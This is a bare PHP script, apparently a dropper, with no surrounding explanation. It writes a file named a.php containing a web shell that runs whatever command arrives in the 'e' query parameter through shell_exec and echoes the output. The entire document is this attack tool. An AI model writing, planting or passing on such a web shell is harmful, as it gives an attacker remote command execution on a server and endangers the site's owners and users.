<?php
$content = "<?php echo shell_exec($_GET['e'].' 2>&1'); ?>";
$fp = fopen("a.php","wb");
fwrite($fp,$content);
fclose($fp);
?>
